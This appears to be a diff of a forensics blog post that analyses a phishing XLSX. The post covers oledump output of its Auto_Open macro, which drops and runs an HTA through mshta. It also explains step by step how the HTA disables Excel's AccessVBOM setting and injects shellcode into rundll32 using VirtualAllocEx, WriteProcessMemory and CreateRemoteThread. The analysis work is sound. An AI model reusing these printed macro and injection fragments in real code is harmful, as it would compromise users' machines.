@@ -9,31 +9,29 @@ series: "Forensics"
 
 - Reading time : "16 min"
 
-
 # The phishing email
 
-
-I got this phsihing email with this information
-
+After receiving this phishing email with this information, the link on the **download** leads to downloading a suspicious XLSX file.
 
 ![alt text](/images/email.png)
 
-
 ## The xlsx file downloadde from the email
 
-file here 
+"By gathering its SHA256 and verifying on [VirusTotal](https://www.virustotal.com/gui/file/3861795ece849d6b417a3c9870a7e0a0eccd27f74e706b9242d94d5e8885b705), we can tell that it is a malicious file."
+
 ```
-sha256sum 0nfoPg800fq06IGB.xlsx                     
+sha256sum 0nfoPg800fq06IGB.xlsx
 3861795ece849d6b417a3c9870a7e0a0eccd27f74e706b9242d94d5e8885b705  0nfoPg800fq06IGB.xlsx
 ```
 
 ![alt text](/images/vtScreen.png)
 
+## Get the macro
 
-## Get the macro 
+Using the tool [oledump.py](https://blog.didierstevens.com/programs/oledump-py/), we could gather the malicious macro code that is embedded in this file
 
 ```
-python3 oledump.py 0nfoPg800fq06IGB.xlsx 
+python3 oledump.py 0nfoPg800fq06IGB.xlsx
 A: xl/vbaProject.bin
  A1:       573 'PROJECT'
  A2:       113 'PROJECTwm'
@@ -55,7 +53,7 @@ A17:       106 'VBA/__SRP_7'
 A18:       882 'VBA/dir'
 ```
 
-or 
+The full function code here :
 
 ```
 python3 oledump.py -s A7 -v  0nfoPg800fq06IGB.xlsx
@@ -212,52 +210,52 @@ Sub Auto_Open()
     Dim fHdswUyK, GgyYKuJh
     Application.Goto ("JLprrpFr")
     GgyYKuJh = Environ("temp") & "\LwTHLrGh.hta"
-    
+
     Open GgyYKuJh For Output As #1
     Write #1, hdYJNJmt(ActiveSheet.Shapes(2).AlternativeText & UZdcUQeJ.yTJtzjKX & Selection)
     Close #1
-    
+
     fHdswUyK = "msh" & "ta " & GgyYKuJh
     x = Shell(fHdswUyK, 1)
 End Sub
 
 ```
 
-## Any Run 
+## Any Run
 
 ![alt text](/images/anyrun.png)
 
+By doing a dynamic analysis of this XLSX in a sandbox, we can see that the suspicious file LwTHLrGh.hta observed above is being recreated and then executed:
 
-[Xlms AnyRun ](https://any.run/report/3861795ece849d6b417a3c9870a7e0a0eccd27f74e706b9242d94d5e8885b705/93db2bda-f745-4f1f-b94a-db476604ddb0#Network)
+- [Full AnyRun report of the xlsx file ](https://any.run/report/3861795ece849d6b417a3c9870a7e0a0eccd27f74e706b9242d94d5e8885b705/93db2bda-f745-4f1f-b94a-db476604ddb0#Network)
 
-
-
-[LwTHLrGh.hta ANyRun](https://any.run/report/8d74853d271ec7a12880c4e33591df212628e3cb6a2f4038adad28c4b6891a96/465f9ebf-785a-4c91-b8e3-f572ae892de3)
 ## Analysee the LwTHLrGh.hta
 
 ![alt text](/images/getAnyRun.png)
 
-## Phase 1: Initial Setup & Security Bypass
+The file LwTHLrGh.hta contains a macro also. Let's walk through it and explain what it will do step by step.
 
+- [Full AnyRun report of the LwTHLrGh.hta file](https://any.run/report/8d74853d271ec7a12880c4e33591df212628e3cb6a2f4038adad28c4b6891a96/465f9ebf-785a-4c91-b8e3-f572ae892de3)
 
-* Creates an invisible Excel instance running in the background
-* User won't see anything happening
+### Phase 1: Initial Setup & Security Bypass
+
+- Creates an invisible Excel instance running in the background
+- User won't see anything happening
 
 ```
 Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule
- 
+
 Set objExcel = CreateObject("Excel.Application")
 objExcel.Visible = False
 ```
 
-* Creates Windows Script Host object to interact with Windows registry and system
+- Creates Windows Script Host object to interact with Windows registry and system
 
 ```
 Set WshShell = CreateObject("Wscript.Shell")
 ```
 
-
-Function to check if the Regexist 
+Function to check if the Regexist
 
 ```
 function RegExists(regKey)
@@ -268,14 +266,15 @@ end function
 
 ```
 
-* Builds path to Excel's security setting that controls macro access
+- Builds path to Excel's security setting that controls macro access
 
 ```
 ' Get the old AccessVBOM value
 RegPath = ""HKEY_CURRENT_USER\Software\Microsoft\Office\"" & objExcel.Version & ""\Excel\Security\AccessVBOM""
 
 ```
-* Check if it does exist 
+
+- Check if it does exist
 
 ```
 if RegExists(RegPath) then
@@ -285,19 +284,19 @@ else
 end if
 ```
 
-* Saves the original security setting so it can be restored later (to hide evidence)
-* DISABLES EXCEL SECURITY by setting AccessVBOM to 1
-* This allows the script to programmatically inject code into Excel
+- Saves the original security setting so it can be restored later (to hide evidence)
+- DISABLES EXCEL SECURITY by setting AccessVBOM to 1
+- This allows the script to programmatically inject code into Excel
 
 ```
 ' Weaken the target
 WshShell.RegWrite RegPath, 1, ""REG_DWORD""
 ```
 
-## Phase 2: Building the Malicious Macro
+### Phase 2: Building the Malicious Macro
 
-* Creates a new Excel workbook 
-* Adds a VBA module to it
+- Creates a new Excel workbook
+- Adds a VBA module to it
 
 ```
 Set objWorkbook = objExcel.Workbooks.Add()
@@ -306,27 +305,26 @@ xlmodule.CodeModule.AddFromString "Private "&"Type PRO"&"CESS_INF"&"ORMATION"...
 
 ```
 
-* Injects obfuscated VBA code into the module
-* Uses &Chr(10)& to insert newlines
-* Uses string concatenation (&) to break up suspicious keywords
-* What the Injected VBA Code Contains:
+- Injects obfuscated VBA code into the module
+- Uses &Chr(10)& to insert newlines
+- Uses string concatenation (&) to break up suspicious keywords
+- What the Injected VBA Code Contains:
 
 ```
 myArray = Array(-35,-63,-65,32,86,66,126,-39,116,36,-12,91,49,-55,-79,98...)
 
 ```
 
-* What the Injected VBA Code Contains:
+- What the Injected VBA Code Contains:
 
 #### Step 2a: Windows API Declarations
-
-
 
 ```
 Private Type PROCESS_INFORMATION
 Private Type STARTUPINFO
 ```
-* Defines Windows structures needed for process manipulation
+
+- Defines Windows structures needed for process manipulation
 
 ```
 Private Declare Function CreateRemoteThread...
@@ -335,16 +333,12 @@ Private Declare Function WriteProcessMemory...
 Private Declare Function CreateProcessA...
 ```
 
+- Declares Windows API functions for:
 
-
-* Declares Windows API functions for:
-
-  * Creating processes
-  * Allocating memory in other processes
-  * Writing to other process memory
-  * Creating remote threads (code execution)
-
-
+  - Creating processes
+  - Allocating memory in other processes
+  - Writing to other process memory
+  - Creating remote threads (code execution)
 
 #### Step 2b: The Shellcode Payload
 
@@ -352,9 +346,9 @@ Private Declare Function CreateProcessA...
 myArray = Array(-35,-63,-65,32,86,66,126,-39,116,36,-12,91,49,-55,-79,98...)
 ```
 
-* This is the actual malware payload
-* It's an encrypted/encoded shellcode stored as signed bytes
-* The negative numbers are just a simple obfuscation (will be converted to unsigned bytes)
+- This is the actual malware payload
+- It's an encrypted/encoded shellcode stored as signed bytes
+- The negative numbers are just a simple obfuscation (will be converted to unsigned bytes)
 
 #### Step 2c: Process Selection
 
@@ -367,10 +361,9 @@ End If
 
 ```
 
-* Detects if system is 64-bit or 32-bit
-* Chooses appropriate rundll32.exe path (a legitimate Windows process)
-* This will be the "host" process for the malware
-
+- Detects if system is 64-bit or 32-bit
+- Chooses appropriate rundll32.exe path (a legitimate Windows process)
+- This will be the "host" process for the malware
 
 #### Step 2d: Create Suspended Process
 
@@ -379,9 +372,9 @@ res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, s
 
 ```
 
-* Calls CreateProcessA (aliased as RunStuff)
-* The ByVal 4& flag means CREATE_SUSPENDED
-* Creates rundll32.exe but keeps it frozen (not running yet)
+- Calls CreateProcessA (aliased as RunStuff)
+- The ByVal 4& flag means CREATE_SUSPENDED
+- Creates rundll32.exe but keeps it frozen (not running yet)
 
 #### Step 2e: Allocate Executable Memory
 
@@ -390,10 +383,10 @@ rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
 
 ```
 
-* Calls VirtualAllocEx (aliased as AllocStuff)
-* Allocates memory in the suspended rundll32.exe process
-* &H1000 = MEM_COMMIT (reserve and commit memory)
-* &H40 = PAGE_EXECUTE_READWRITE (memory can be executed)
+- Calls VirtualAllocEx (aliased as AllocStuff)
+- Allocates memory in the suspended rundll32.exe process
+- &H1000 = MEM_COMMIT (reserve and commit memory)
+- &H40 = PAGE_EXECUTE_READWRITE (memory can be executed)
 
 #### Step 2f: Write Shellcode to Target Process
 
@@ -404,9 +397,9 @@ For offset = LBound(myArray) To UBound(myArray)
 Next offset
 ```
 
-* Writes each byte of the shellcode into the allocated memory
-* Loops through the entire myArray
-* Uses WriteProcessMemory (aliased as WriteStuff)
+- Writes each byte of the shellcode into the allocated memory
+- Loops through the entire myArray
+- Uses WriteProcessMemory (aliased as WriteStuff)
 
 #### Step 2g: Execute the Shellcode
 
@@ -414,9 +407,9 @@ Next offset
 vbares = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
 ```
 
-* Calls CreateRemoteThread (aliased as CreateStuff)
-* Starts a new thread in rundll32.exe pointing to the shellcode
-* The malware now executes inside a legitimate Windows process
+- Calls CreateRemoteThread (aliased as CreateStuff)
+- Starts a new thread in rundll32.exe pointing to the shellcode
+- The malware now executes inside a legitimate Windows process
 
 #### Step 2h: Auto-execution Triggers
 
@@ -426,11 +419,10 @@ Sub AutoOpen()
 Sub Workbook_Open()
 ```
 
-* Multiple entry points ensure the code runs when:
+- Multiple entry points ensure the code runs when:
 
-    * Excel workbook opens
-    * Macros are enabled
-
+  - Excel workbook opens
+  - Macros are enabled
 
 #### Phase 3: Execute the Injected Macro
 
@@ -440,11 +432,9 @@ on error resume next
 objExcel.Run "Auto_Open"
 ```
 
-
-* Disables Excel warnings/alerts
-* Ignores any errors (to avoid detection)
-* Runs the malicious macro that was just injected
-
+- Disables Excel warnings/alerts
+- Ignores any errors (to avoid detection)
+- Runs the malicious macro that was just injected
 
 #### Phase 4: Cleanup & Cover Tracks
 
@@ -453,8 +443,8 @@ objWorkbook.Close False
 objExcel.Quit
 ```
 
-* Closes the workbook without saving
-* Closes Excel
+- Closes the workbook without saving
+- Closes Excel
 
 ```
 if action = "" then
@@ -464,8 +454,9 @@ else
 end if
 ```
 
-
 ## Decoding the Array
+
+With this python script we can decode the obfuscated code
 
 ```
 import re
@@ -484,10 +475,11 @@ decoded = decoded.replace('&', '')
 print(decoded)
 ```
 
-## Create the code for 
+## Create the code for
 
+This will create a binary file where we can then analyze with [scdbg](https://sandsprite.com/CodeStuff/scdbg_manual/MANUAL_EN.html) or other shellcode analysis tools.
 
-This will create a binary file that you can then analyze with scdbg or other shellcode analysis tools.
+But First we need to create a binary file with this shellcode.
 
 ```
 shellcode = [
@@ -499,13 +491,12 @@ with open("out.bin", "wb") as out:
     for b in shellcode:
         out.write((b & 0xff).to_bytes(1, 'little'))
 ```
-The & 0xff operation correctly handles the negative values in your array by converting them to their unsigned byte equivalents (e.g., -35 becomes 221). This will create a binary file that you can then analyze with scdbg or other shellcode analysis tools.
 
+The & 0xff operation correctly handles the negative values in your array by converting them to their unsigned byte equivalents (e.g., -35 becomes 221). This will create a binary file that you can then analyze with scdbg or other shellcode analysis tools.
 
 ## ShellCode analysis
 
-To analyze your shellcode with scdbg, use this command:
-
+To analyze the shellcode with scdbg, we can use this command:
 
 ```
 scdbg.exe /f out.bin
